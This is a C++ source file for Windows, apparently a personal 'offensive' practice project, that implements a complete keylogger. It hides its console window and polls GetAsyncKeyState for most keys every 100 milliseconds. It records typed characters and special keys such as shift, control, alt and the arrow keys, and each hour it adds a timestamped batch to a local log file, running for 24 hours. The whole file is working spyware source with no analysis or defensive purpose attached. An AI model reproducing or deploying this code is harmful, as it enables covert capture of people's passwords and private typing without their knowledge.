//Created 9/7/2024
//Sebastian Hyjek

#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <string>
#include <fstream>
#include <ctime>
#include <vector>
#include <numeric>

using namespace std;
vector<string> buffer;

void writeToFile(const string& content)
{
    string path = R"(C:\Users\sebas\source\repos\C and C++\Offensive_C\keylogger\key_log.txt)";

    ofstream MyFile(path, ios::app);
    if (MyFile.is_open())
    {
        MyFile << content;
        MyFile.close();
        std::cout << "File written successfully." << std::endl;
    } else {
        std::cerr << "Unable to open file." << std::endl;
    }
}

string getCurrentTimestamp() {
    // Get the current time
    auto now = std::chrono::system_clock::now();
    // Convert to time_t to get the time in seconds
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);
    // Convert to a readable format
    char buffer[100];
    std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", std::localtime(&now_time));
    return buffer;
}

void writeData()
{
    string data = accumulate(buffer.begin(), buffer.end(), string());
    writeToFile(getCurrentTimestamp() + "\n" + data + "\n");
    buffer.clear();
}

bool checkSpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        cout << " ";
        buffer.emplace_back(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        buffer.emplace_back("\n");
        return true;
    case '¾':
        cout << ".";
        buffer.emplace_back(".");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        buffer.emplace_back("#SHIFT#");
        return true;
    case VK_BACK:
        cout << "\b";
        buffer.emplace_back("\b");
        return true;
    case VK_RBUTTON:
        cout << "#R_CLICK#";
        buffer.emplace_back("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        buffer.emplace_back("#CAPS_LOCK#");
        return true;
    case VK_TAB:
        cout << "#TAB#";
        buffer.emplace_back("TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        buffer.emplace_back("#UP");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        buffer.emplace_back("#DOWN");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        buffer.emplace_back("#LEFT");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        buffer.emplace_back("#RIGHT");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL";
        buffer.emplace_back("#CONTROL");
        return true;
    case VK_MENU:
        cout << "#ALT";
        buffer.emplace_back("#ALT");
        return true;
    default:
        return false;
    }
}

void logKeys()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    for (int KEY = 8; KEY <= 190; KEY++)
    {
        if (GetAsyncKeyState(KEY) == -32767) {
            if (checkSpecialKeys(KEY) == false) {
                char chr_KEY = static_cast<char>(KEY);
                string string_representation(1, chr_KEY);
                buffer.emplace_back(string_representation);
            }
        }
    }
}

int main() {
    auto start = chrono::steady_clock::now();
    auto end = start + chrono::hours(24);
    auto nextWriteTime = start + chrono::hours(1);
    while(chrono::steady_clock::now() < end)
    {
        Sleep(100);

        logKeys();

        if(chrono::steady_clock::now() >= nextWriteTime)
        {
            writeData();
            nextWriteTime += std::chrono::hours(1);
        }
    }
    return 0;
}
